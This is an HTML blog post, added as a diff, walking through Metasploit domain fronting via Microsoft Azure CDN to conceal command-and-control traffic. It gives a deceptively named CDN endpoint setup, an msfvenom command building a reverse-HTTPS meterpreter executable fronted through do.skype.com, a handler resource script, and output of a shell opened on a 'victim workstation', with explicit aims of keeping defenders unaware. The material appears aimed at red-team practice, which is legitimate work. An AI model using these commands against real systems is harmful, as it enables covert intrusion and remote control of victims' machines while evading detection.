@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Chris Higgins">
+    <meta name="description" content="Description Here">
+    <meta name="keywords" content="security,beer,brewer,metasploit,infosec">
+
+    <base href="https://chigstuff.com/">
+    <title>
+  Metasploit Domain Fronting With Microsoft Azure · Chiggins Stuff
+</title>
+
+    <link rel="canonical" href="https://chigstuff.com/blog/metasploit-domain-fronting-with-microsoft-azure/">
+
+    <link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700">
+    <link rel="stylesheet" href="//cdn.rawgit.com/necolas/normalize.css/master/normalize.css">
+    <link rel="stylesheet" href="https://chigstuff.com/css/style.min.css">
+
+    <link rel="icon" type="image/png" href="https://chigstuff.com/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://chigstuff.com/images/favicon-16x16.png" sizes="16x16">
+
+    
+
+    <meta name="generator" content="Hugo 0.37.1" />
+  </head>
+
+  <body>
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://chigstuff.com/">
+      Chiggins Stuff
+    </a>
+    
+    <ul class="navigation-list float-right">
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="/blog/">Blog</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="/contributions/">Contributions</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="/files/resume.pdf">Resume</a>
+      </li>
+      
+      <li class="navigation-item">
+        <a class="navigation-link" href="/about/">About</a>
+      </li>
+      
+    </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1>Metasploit Domain Fronting With Microsoft Azure</h1>
+    </header>
+
+    
+
+<p>Domain fronting has been one of the biggest &ldquo;new-hotnesses&rdquo; of the past few years and rightly so. It helps to mask your C2 traffic behind well-known domains and does a fairly good job at keeping defenders in the dark. We&rsquo;ve seen plenty of resources setting up domain fronting for <a href="https://www.xorrior.com/Empire-Domain-Fronting/">Empire</a> and <a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/">Cobalt Strike</a>, which have definitely helped to pave the way. Domain fronting support was <a href="https://github.com/rapid7/metasploit-framework/pull/8948">finally added</a> into the Metasploit Framework in late 2017 and now we&rsquo;re starting to see <a href="https://beyondbinary.io/articles/domain-fronting-with-metasploit-and-meterpreter/">various</a> <a href="https://bitrot.sh/post/30-11-2017-domain-fronting-with-meterpreter/">resources</a> to help set that up for you.</p>
+
+<p>An observation that I&rsquo;ve made is that it seems most people like to use AWS CloudFront as their CDN of choice for domain fronting, and I&rsquo;ll admit I fall guilty to that. Microsoft Azure also has domain fronting capabilities in their CDN infrastructure, so in this post we&rsquo;ll focus on setting up Metasploit domain fronting with Azure.</p>
+
+<h2 id="setting-up-azure">Setting Up Azure</h2>
+
+<p>The setup for Azure is pretty straight forward and doesn&rsquo;t stray too far from CloudFront, just that you&rsquo;re using a different system. Once in Azure, you&rsquo;ll want to create a CDN resource and create an endpoint for that resource.</p>
+
+<p><img src="/images/metasploit_azure_domain_fronting/1.png" alt="CDN Setup Screenshot" /></p>
+
+<p>There&rsquo;s a few things that we need to take special attention to here:</p>
+
+<ul>
+<li><strong>CDN Endpoint Name</strong>: This is what is going to be in your <code>Host</code> header in the HTTP request, and what will ultimately point to your C2 infrastructure. You&rsquo;ll want this to be something clever sounding, maybe something to deal with marketing or banking, however you decide to conceal yourself.</li>
+<li><strong>Origin Hostname</strong>: This is your IP address or DNS name for you C2 infrastructure. This part will <em>not</em> be revealed to your end users / blue team. It&rsquo;s pretty much the final piece of glue to connect the CDN to your resources and get domain working.</li>
+</ul>
+
+<p>Now that you&rsquo;ve got your CDN and an endpoint created, it&rsquo;s time to wait. It can take the better part of an hour for the endpoint to propogate throughout the CDN. While we wait, we need to make sure we update the endpoint&rsquo;s caching settings. The reason we do this is because we don&rsquo;t want the CDN to act like a <em>real</em> CDN and cache our traffic, and instead just use the CDN as a communications channel.</p>
+
+<p><img src="/images/metasploit_azure_domain_fronting/2.png" alt="CDN Cache Screenshot" /></p>
+
+<p>Change your caching and query string caching behaviors to bypass and you&rsquo;ll be all set.</p>
+
+<h3 id="finding-domain-frontable-azure-domains">Finding domain frontable Azure domains</h3>
+
+<p>Now that your CDN is setup and propogating, we need to find a high-profile domain name to hide behind that will also work for our CDN. <a href="https://twitter.com/a_profligate">@a_profligate</a> has a blog post <a href="https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html">Finding Domain frontable Azure domains</a> that does a pretty good job explaining how to find a domain to front with. I&rsquo;m not going to bother re-inventing the wheel here, give that article a read. For the sake of this post, I&rsquo;ll use <code>do.skype.com</code> as my front domain.</p>
+
+<h3 id="test-the-cdn">Test the CDN</h3>
+
+<p>Before we dive into Metasploit, we need to make sure our CDN communication is properly setup. I&rsquo;ve got Nginx setup on my C2 server for testing purposes so it should respond the same way hitting it directly and hitting it through the CDN. When hitting it through the CDN with your newly chosen frontable Azure domain, you&rsquo;ll want to set the <code>Host</code> header to the FQDN you created before.</p>
+
+<pre><code>╭─chiggins at razer in ~
+╰─○ curl &quot;https://ohnoitsascarymaliciousdomain.fun&quot;
+&lt;h1&gt;Hello&lt;/h1&gt;
+
+&lt;p&gt;This is hosted from Nginx.&lt;/p&gt;
+
+╭─chiggins at razer in ~
+╰─○ curl --header &quot;Host: something-clever.azureedge.net&quot; &quot;https://do.skype.com&quot;
+&lt;h1&gt;Hello&lt;/h1&gt;
+
+&lt;p&gt;This is hosted from Nginx.&lt;/p&gt;
+</code></pre>
+
+<h2 id="setting-up-metasploit">Setting Up Metasploit</h2>
+
+<p>First things first you&rsquo;ll want to generate your payload. Here&rsquo;s the payload getting generated on my C2 host.</p>
+
+<pre><code>╭─root at ip-10-2-0-235 in ~/metasploit-framework
+╰─± ./msfvenom -p windows/meterpreter/reverse_https LHOST=do.skype.com LPORT=443 HttpHostHeader=something-clever.azureedge.net -f exe -o /var/www/html/exploit.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 463 bytes
+Final size of exe file: 73802 bytes
+Saved as: /var/www/html/exploit.exe
+</code></pre>
+
+<p>Two things to take special note of here:</p>
+
+<ul>
+<li><strong>LHOST</strong>: This is going to be the frontable domain you discovered earlier.</li>
+<li><strong>HttpHostHeader</strong>: This new option is what will set the <code>Host</code> entry in your HTTP request. This should be set to your CDN endpoint.</li>
+</ul>
+
+<p>For the sake of simplicity I have a resource script setup so that when I start Metasploit, it&rsquo;ll start up my handler with all the right options.</p>
+
+<pre><code>╭─root at ip-10-2-0-235 in ~/metasploit-framework
+╰─± cat ~/df_azure.rc
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST do.skype.com
+set LPORT 443
+set HttpHostHeader something-clever.azureedge.net
+set ExitOnSession false
+run -j
+╭─root at ip-10-2-0-235 in ~/metasploit-framework
+╰─± ./msfconsole -qr ~/df_azure.rc
+[*] Processing /root/df_azure.rc for ERB directives.
+resource (/root/df_azure.rc)&gt; use multi/handler
+resource (/root/df_azure.rc)&gt; set payload windows/meterpreter/reverse_https
+payload =&gt; windows/meterpreter_reverse_https
+resource (/root/df_azure.rc)&gt; set LHOST do.skype.com
+LHOST =&gt; do.skype.com
+resource (/root/df_azure.rc)&gt; set LPORT 443
+LPORT =&gt; 443
+resource (/root/df_azure.rc)&gt; set HttpHostHeader something-clever.azureedge.net
+HttpHostHeader =&gt; something-clever.azureedge.net
+resource (/root/df_azure.rc)&gt; set ExitOnSession false
+ExitOnSession =&gt; false
+resource (/root/df_azure.rc)&gt; run -j
+[*] Exploit running as background job 0.
+
+[-] Handler failed to bind to 72.21.81.200:443
+msf5 exploit(multi/handler) &gt; [*] Started HTTPS reverse handler on https://0.0.0.0:443
+
+msf5 exploit(multi/handler) &gt; jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  windows/meterpreter/reverse_https  https://do.skype.com:443
+
+msf5 exploit(multi/handler) &gt;
+</code></pre>
+
+<p>You&rsquo;ll notice that there&rsquo;s an error binding to <code>72.21.81.200:443</code>. That&rsquo;s because that is the IP address of <code>do.skype.com</code>, which is fine, because the handler also binds on <code>0.0.0.0:443</code> which will work out perfectly for us.</p>
+
+<p>Transfer your payload onto your victim workstation and run it and you should see great success and a meterpreter shell call back!</p>
+
+<pre><code>[*] https://do.skype.com:443 handling request from 152.195.6.101; (UUID: 3cxijbex) Staging x86 payload (180901 bytes) ...
+[*] Meterpreter session 1 opened (10.2.0.235:443 -&gt; 152.195.6.101:38626) at 2018-04-03 21:02:31 +0000
+
+msf5 exploit(multi/handler) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; sysinfo
+Computer        : DESKTOP-1RB861P
+OS              : Windows 10 (Build 16299).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter &gt;
+</code></pre>
+
+<p>Because the payload utlizes both domain fromting via <code>do.skype.com</code> and HTTPS, the traffic in transit really looks like nothing out of the orginary.</p>
+
+<p><img src="/images/metasploit_azure_domain_fronting/3.png" alt="Wireshark capture of payload" /></p>
+
+<p>And there you have it &ndash; successful domain fronting with Metasploit via Microsoft Azure! If you have any questions or comments, feel free to hit me up on Twitter <a href="https://twitter.com/ch1gg1ns">@ch1gg1ns</a>.</p>
+
+  </article>
+</section>
+
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    © 2018 · Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+  </section>
+</footer>
+
+    </main>
+
+    
+
+  </body>
+
+</html>
